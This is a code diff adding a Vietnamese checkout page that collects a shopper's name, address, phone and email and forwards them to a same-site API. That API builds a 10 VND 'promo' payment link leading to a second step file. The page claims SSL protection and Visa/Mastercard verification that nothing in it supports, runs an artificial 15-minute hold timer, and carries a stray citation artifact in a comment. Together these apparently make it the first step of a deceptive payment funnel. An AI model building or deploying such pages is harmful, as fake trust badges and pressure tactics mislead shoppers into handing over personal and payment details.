@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Thanh toán bảo mật — Thông tin (Việt Nam)</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://unpkg.com/intl-tel-input@17.0.19/build/css/intlTelInput.min.css" rel="stylesheet">
+    <style>
+        .bg-yellow { background-color: #FFDD00; }
+        .fs-09 { font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+<script>
+    sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
+</script>
+
+<div>
+    <div class="row justify-content-between p-2 bg-black text-white">
+        <p class="text-left mb-0 pb-0 col-auto"><i class="fas fa-lock"></i> Thanh toán an toàn SSL</p>
+        <p class="text-right mb-0 pb-0 col-auto">Được xác minh bởi <i class="fab fa-cc-visa"></i> <i class="fab fa-cc-mastercard"></i></p>
+    </div>
+    
+    <div class="row row-cols-md-2 row-cols-1 gy-4 gx-0">
+        <div class="col">
+            <div style="max-width: 550px;" class="me-md-0 mx-auto">
+                
+                <!-- Countdown Timer -->
+                <div class="px-4 pt-4 fw-bold">
+                    <div class="bg-yellow text-black rounded p-3 d-flex align-items-center justify-content-center gap-2 flex-wrap">
+                        <i class="fa-regular fa-clock"></i>
+                        <div>Đơn hàng của bạn được giữ trong: <span id="countdown">14:44</span></div>
+                    </div>
+                </div>
+
+                <!-- Progress Steps -->
+                <div class="row row-cols-3 rounded-pill gx-0 p-4">
+                    <div class="col text-center">
+                        <p class="mb-0">Giỏ hàng</p>
+                        <div class="rounded-start-pill" style="height: 20px; background-color: #000; border: 1px solid #000"></div>
+                    </div>
+                    <div class="col text-center">
+                        <p class="mb-0">Thông tin</p>
+                        <div class="progress-box border-start-0 border-end-0" style="height: 20px; background-color: #ccc; border: 1px solid #000" data-progress="1"></div>
+                    </div>
+                    <div class="col text-center">
+                        <p class="mb-0">Thanh toán</p>
+                        <div class="rounded-end-pill border-dark border progress-box" style="height: 20px; background-color: #fff" data-progress="2"></div>
+                    </div>
+                </div>
+
+                <!-- Order Summary Price Display -->
+                <div class="px-4 mb-2">
+                    <div class="p-3 bg-light rounded border d-flex justify-content-between align-items-center">
+                        <span class="fw-bold">Tổng số tiền:</span>
+                        <span class="fw-bold fs-5 text-success">10.00 VND</span>
+                    </div>
+                </div>
+
+                <!-- Information Form -->
+                <div class="p-4 py-2 py-sm-3">
+                    <form id="cart-form">
+                        <div class="d-flex flex-column row-input gap-2">
+                            <div class="d-flex gap-2">
+                                <div style="flex: 1"><input type="text" id="firstName" placeholder="Tên" required class="form-control" maxlength="255"></div>
+                                <div style="flex: 1"><input type="text" id="lastName" placeholder="Họ" required class="form-control" maxlength="255"></div>
+                            </div>
+                            <div><input id="billingStreet" type="text" placeholder="Địa chỉ" required class="form-control" maxlength="255"></div>
+                            <div class="d-flex gap-2">
+                                <div style="flex: 1"><input id="billingPostcode" type="text" placeholder="Mã bưu điện" required class="form-control" maxlength="12"></div>
+                                <div style="flex: 1"><input id="billingCity" type="text" placeholder="Thành phố" required class="form-control" maxlength="255"></div>
+                            </div>
+                            <div>
+                                <select id="country_code" class="form-control" disabled>
+                                    <option value="Vietnam" selected>Vietnam</option>
+                                </select>
+                            </div>
+                            <div><input type="tel" id="phone" placeholder="Số điện thoại" class="form-control" required style="width: 100%;"></div>
+                            <div><input type="email" id="emailInput" placeholder="E-mail" required class="form-control" maxlength="255"></div>
+                        </div>
+
+                        <div class="w-100 mt-3">
+                            <button type="button" id="nextBtn" class="border-0 fs-5 my-3 w-100 btn btn-success text-uppercase">Tiếp tục thanh toán</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://unpkg.com/intl-tel-input@17.0.19/build/js/intlTelInput.min.js"></script>
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const affiliateRef = params.get('ref');
+
+    let promoFlowId = sessionStorage.getItem("promo_flow_id");
+    if (!promoFlowId) {
+        promoFlowId = window.crypto && typeof window.crypto.randomUUID === "function" ? window.crypto.randomUUID() : Math.random().toString(36).substring(2);
+        sessionStorage.setItem("promo_flow_id", promoFlowId);
+    }
+
+    var phoneInput = document.querySelector("#phone");
+    var iti = window.intlTelInput(phoneInput, {
+        initialCountry: "vn",
+        separateDialCode: true,
+        utilsScript: "https://unpkg.com/intl-tel-input@17.0.19/build/js/utils.js"
+    });
+
+    document.getElementById('nextBtn').onclick = async () => {
+        await iti.promise;
+        const fullPhoneNumber = iti.getNumber();
+
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName = document.getElementById('lastName').value.trim();
+        const address = document.getElementById('billingStreet').value.trim();
+        const postcode = document.getElementById('billingPostcode').value.trim();
+        const city = document.getElementById('billingCity').value.trim();
+        const email = document.getElementById('emailInput').value.trim();
+
+        if (!firstName || !lastName || !address || !postcode || !city || !email || !fullPhoneNumber) {
+            alert("Vui lòng điền đầy đủ các trường bắt buộc.");
+            return;
+        }
+
+        try {
+            document.getElementById('nextBtn').disabled = true;
+            document.getElementById('nextBtn').textContent = "Đang tạo liên kết thanh toán bảo mật...";
+
+            const response = await fetch("/api/create-promo-checkout-link", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    plan: "2695",
+                    step2File: "xo-vn-2.html", // Target redirect file name containing 'xo-'[cite: 4]
+                    currency: "VND",
+                    amount: 10.00,
+                    sourcePage: window.location.href,
+                    firstName: firstName,
+                    lastName: lastName,
+                    name: `${firstName} ${lastName}`,
+                    email: email,
+                    phonePrefix: "+" + iti.getSelectedCountryData().dialCode,
+                    phone: fullPhoneNumber,
+                    address: address,
+                    postcode: postcode,
+                    city: city,
+                    country: "Vietnam",
+                    ref: affiliateRef,
+                    originalQueryString: sessionStorage.getItem("orig_qs") || "",
+                    successUrl: params.get("successUrl") || ""
+                })
+            });
+
+            const data = await response.json();
+            if (!response.ok || !data.url) {
+                throw new Error(data.error || "Không thể tạo liên kết thanh toán bảo mật.");
+            }
+
+            let nextUrl = window.location.origin + data.url + "?" + sessionStorage.getItem("orig_qs");
+            window.location.href = nextUrl;
+        } catch (error) {
+            document.getElementById('nextBtn').disabled = false;
+            document.getElementById('nextBtn').textContent = "Tiếp tục thanh toán";
+            alert(error.message || "Đã xảy ra lỗi.");
+        }
+    };
+
+    function startTimer(duration, display) {
+        let timer = duration, minutes, seconds;
+        setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+            display.textContent = minutes + ":" + seconds;
+            if (--timer < 0) timer = 0;
+        }, 1000);
+    }
+    document.addEventListener("DOMContentLoaded", function () {
+        startTimer(60 * 15, document.querySelector('#countdown'));
+    });
+</script>
+</body>
+</html>
